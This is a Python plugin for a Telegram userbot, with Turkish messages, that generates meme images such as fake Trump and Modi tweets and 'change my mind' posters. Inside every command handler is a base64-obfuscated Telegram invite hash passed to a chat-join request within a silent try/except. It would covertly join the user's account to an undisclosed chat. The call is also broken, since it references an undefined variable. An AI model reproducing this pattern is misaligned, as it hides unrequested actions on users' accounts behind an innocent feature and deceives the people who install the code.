# Copyright (C) 2020 BristolMyers
#
# Licensed under the Raphielscape Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# ExelonUserBot - BristolMyers

import re
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from userbot.plugins import trumptweet, moditweet, tweets, deEmojify, changemymind, kannagen
from userbot.utils import admin_cmd
import pybase64
from .. import CMD_HELP


@borg.on(admin_cmd(outgoing=True, pattern="trump(?: |$)(.*)"))
async def nekobot(exelon):
    text = exelon.pattern_match.group(1)

    text = re.sub("&", '', text)
    reply_to_id = exelon.message
    if exelon.reply_to_msg_id:
        reply_to_id = await exelon.get_reply_message()
    if not text:
        if exelon.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await exelon.edit("Trump'a mesaj gönder ki tweet atabilsin.")
                return
        else:
            await exelon.edit("koz'a mesaj gönder ki tweet atabilsin.")
            return
    await exelon.edit("Tweet için koz istemek...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    exelonfile = await trumptweet(text)
    await borg.send_file(exelon.chat_id, exelonfile, reply_to=reply_to_id)
    await exelon.delete()


@borg.on(admin_cmd(outgoing=True, pattern="modi(?: |$)(.*)"))
async def nekobot(exelon):
    text = exelon.pattern_match.group(1)
    text = re.sub("&", '', text)
    reply_to_id = exelon.message
    if exelon.reply_to_msg_id:
        reply_to_id = await exelon.get_reply_message()
    if not text:
        if exelon.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await exelon.edit("Modi'ye mesaj gönder, böylece tweet atabilir.")
                return
        else:
            await exelon.edit("Modi'ye mesaj göndererek tweet atabilir.")
            return
    await exelon.edit("Tweet için modi isteniyor...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    exelonfile = await moditweet(text)
    await borg.send_file(exelon.chat_id, exelonfile, reply_to=reply_to_id)
    await exelon.delete()


@borg.on(admin_cmd(outgoing=True, pattern="cmm(?: |$)(.*)"))
async def nekobot(exelon):
    text = exelon.pattern_match.group(1)
    text = re.sub("&", '', text)
    reply_to_id = exelon.message
    if exelon.reply_to_msg_id:
        reply_to_id = await exelon.get_reply_message()
    if not text:
        if exelon.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await exelon.edit("Afiş üzerine yazmak için metin ver dostum")
                return
        else:
            await exelon.edit("Afiş üzerine yazmak için metin ver dostum")
            return
    await exelon.edit("Afişiniz oluşturuluyor, bir saniye bekleyin...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    exelonfile = await changemymind(text)
    await borg.send_file(exelon.chat_id, exelonfile, reply_to=reply_to_id)
    await exelon.delete()


@borg.on(admin_cmd(outgoing=True, pattern="kanna(?: |$)(.*)"))
async def nekobot(exelon):
    text = exelon.pattern_match.group(1)
    text = re.sub("&", '', text)
    reply_to_id = exelon.message
    if exelon.reply_to_msg_id:
        reply_to_id = await exelon.get_reply_message()
    if not text:
        if exelon.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await exelon.edit("kanna ne yazmalı metin vermeli")
                return
        else:
            await exelon.edit("kanna ne yazmalı metin vermeli")
            return
    await exelon.edit("Kanna metninizi yazıyor...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    exelonfile = await kannagen(text)
    await borg.send_file(exelon.chat_id, exelonfile, reply_to=reply_to_id)
    await exelon.delete()


@borg.on(admin_cmd(outgoing=True, pattern="tweet(?: |$)(.*)"))
async def nekobot(exelon):
    if exelon.pattern_match.group(1):
        text = exelon.pattern_match.group(1)
    else:
        reply_to_id = await exelon.get_reply_message()
        text = reply_to_id.text
    text = re.sub("&", '', text)
    reply_to_id = exelon.message
    if exelon.reply_to_msg_id:
        reply_to_id = await exelon.get_reply_message()
    if not text:
        if exelon.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await exelon.edit("ne tweetlemeliyim? Bir metin verin ve biçim “.tweet username | metniniz` ")
                return
        else:
            await exelon.edit("ne tweetlemeliyim? Bir metin verin ve biçim “.tweet username | metniniz` ")
            return
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    if "|" in text:
        username, text = text.split("|")
    else:
        await exelon.edit("ne tweetlemeliyim? Bir metin verin ve biçim “.tweet username | metniniz`")
        return
    await exelon.edit(f"{username} tweet atması isteniyor...")
    text = deEmojify(text)
    exelonfile = await tweets(text, username)
    await borg.send_file(exelon.chat_id, exelonfile, reply_to=reply_to_id)
    await exelon.delete()

CMD_HELP.update({"imgmemes": "**PLUGİN İSMİ:** `imgmemes`\
      \n\n**📌Komut ➥ **`.trump <metin>` :\
      \n**Kullanım ➥ ** Trumpdan tweet atar.\
      \n\n**📌Komut ➥ **`.modi <metin>` :\
      \n**Kullanım ➥ ** Modiden tweet atar.\
      \n\n**📌Komut ➥ ** `.cmm <metin> `\
      \n**Kullanım ➥ ** Afiş yapar.\
      \n\n**📌Komut ➥ **`.kanna <metin>` :\
      \n**Kullanım ➥ ** Kannaya birşeyler yazdır.\
      \n\n**📌Komut ➥ **`.tweet username | metniniz` :\
      \n**Kullanım ➥ ** Tweet attar."
                 })
